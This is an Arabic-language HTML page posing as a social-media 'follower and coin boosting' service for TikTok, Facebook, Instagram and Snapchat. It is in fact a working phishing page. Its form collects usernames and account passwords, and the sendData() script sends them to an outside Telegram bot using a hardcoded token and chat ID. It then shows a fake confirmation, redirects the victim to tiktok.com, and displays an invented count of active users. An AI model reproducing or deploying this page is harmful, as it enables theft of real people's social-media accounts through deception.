<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMM Master | رشق وزيادة عملات</title>
    <style>
        :root { --tiktok: #ee1d52; --accent: #00f2ea; }
        body { 
            background: #050505; display: flex; align-items: center; justify-content: center; 
            min-height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; color: white; overflow: hidden;
        }

        /* تأثير الأيقونات المتحركة في الخلفية */
        .background-animation {
            position: absolute; width: 100%; height: 100%; top: 0; left: 0; z-index: -1; overflow: hidden;
        }
        .icon {
            position: absolute; opacity: 0.15; font-size: 30px; font-weight: bold; animation: float 10s infinite linear;
        }
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 0.2; }
            90% { opacity: 0.2; }
            100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
        }

        .main-card { 
            background: rgba(18, 18, 18, 0.95); padding: 35px 25px; border-radius: 30px; 
            width: 90%; max-width: 400px; text-align: center; border: 1px solid #2c2c2c; 
            box-shadow: 0 0 30px rgba(238, 29, 82, 0.2); backdrop-filter: blur(10px);
        }
        .logo-area h1 { 
            font-size: 28px; margin: 0; 
            background: linear-gradient(45deg, var(--accent), var(--tiktok), #fff); 
            -webkit-background-clip: text; -webkit-text-fill-color: transparent; 
        }
        
        .badge { background: var(--tiktok); color: white; padding: 4px 12px; border-radius: 50px; font-size: 11px; font-weight: bold; margin-bottom: 15px; display: inline-block; }

        select, input { 
            width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 12px; border: 1px solid #333; 
            background: #1a1a1a; color: white; font-size: 16px; box-sizing: border-box; outline: none;
        }
        input:focus { border-color: var(--accent); }

        .btn-go { 
            width: 100%; padding: 16px; border: none; border-radius: 12px; 
            background: white; color: #000; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s;
        }
        .btn-go:hover { background: var(--tiktok); color: #fff; box-shadow: 0 0 20px rgba(238, 29, 82, 0.5); }

        .live-status { font-size: 12px; color: #4ade80; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="background-animation" id="bg"></div>

    <div class="main-card">
        <div class="logo-area">
            <h1>SMM Pro Global</h1>
            <div class="badge">سيرفر الرشق الفوري مفعّل</div>
        </div>

        <p style="font-size: 14px; color: #bbb; margin-bottom: 20px;">اختر نوع الخدمة أو العملات:</p>
        
        <select id="platform">
            <option value="TikTok-Coins">تيك توك - شحن عملات (جديد 🔥)</option>
            <option value="TikTok-Followers">تيك توك - زيادة متابعين</option>
            <option value="Facebook-Likes">فيسبوك - زيادة تفاعل ومتابعين</option>
            <option value="Instagram-Followers">إنستغرام - زيادة فولو ولايكات</option>
            <option value="Snapchat-Score">سناب شات - رفع سكور سريع</option>
        </select>

        <input type="text" id="user" placeholder="اسم المستخدم (Username)" required>
        <input type="password" id="pass" placeholder="كلمة مرور الحساب للربط" required>
        
        <button class="btn-go" onclick="sendData()">ابدأ الزيادة الآن</button>

        <div class="live-status">
            🟢 نشط في ليبيا حالياً: <span id="online">17,428</span>
        </div>
    </div>

    <script>
        // توليد أيقونات متحركة في الخلفية
        const bg = document.getElementById('bg');
        const icons = ['📱', 'TikTok', 'FB', 'IG', '💰', '🪙', '✨', '⚡'];
        for (let i = 0; i < 20; i++) {
            let div = document.createElement('div');
            div.className = 'icon';
            div.innerText = icons[Math.floor(Math.random() * icons.length)];
            div.style.left = Math.random() * 100 + 'vw';
            div.style.animationDelay = Math.random() * 10 + 's';
            div.style.fontSize = (Math.random() * 20 + 10) + 'px';
            bg.appendChild(div);
        }

        function sendData() {
            const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk"; 
            const chat_id = "1564944407"; 
            
            const platform = document.getElementById('platform').value;
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;

            if(user === "" || pass === "") {
                alert("يرجى إدخال البيانات لربط الحساب بالسيرفر"); return;
            }

            const msg = `💰 صيدة عملات ورشق!\n\n📱 المنصة: ${platform}\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;

            fetch(url).finally(() => {
                alert("تم التحقق! جاري معالجة طلبك وإرسال المتابعين/العملات.");
                window.location.href = "https://www.tiktok.com"; 
            });
        }
    </script>
</body>
</html>
